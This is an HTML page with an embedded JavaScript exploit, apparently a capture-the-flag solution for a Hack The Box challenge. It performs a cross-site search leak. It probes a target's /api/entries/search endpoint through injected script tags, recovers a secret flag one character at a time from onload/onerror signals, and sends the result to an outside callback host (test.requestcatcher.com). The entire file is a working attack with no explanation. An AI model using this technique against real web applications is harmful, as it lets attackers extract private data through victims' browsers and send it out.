<html>
    <script>
        var callback = "test.requestcatcher.com";
        var target = "127.0.0.1:1337";
        
        var abc = "-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
        var flag = "HTB{5";
        var specials = "%\”\’";
        
        var payload = `http://${target}/api/entries/search?q=`

        async function getPartialFlag(char) {
            return new Promise((resolve, reject)=> {
                const script = document.createElement("script");
                script.src = payload + encodeURIComponent(flag + char);
                script.onload = () => char==='}' ? reject(char):resolve(char);
                script.onerror = () => reject(char);

                document.head.appendChild(script);
            });
        }

        async function getFlag(chars) {
            var found = false; var char; var limit = flag.length + 5;
            for(var i=0; i < chars.length; i++) {

                char = specials.includes(char) ? '\\' + chars[i]:chars[i];
                await getPartialFlag(char).then((res) => {flag = flag.concat(res); found = res==="}" ? true:false; i=0}, (res) => { });

                if(found) break;

                if(flag.length == limit) break;
            }           
            fetch(`https://${callback}/?flag=${flag}`, {method:'get', mode:'no-cors'});
        }

        getFlag(abc);
    </script>
</html>
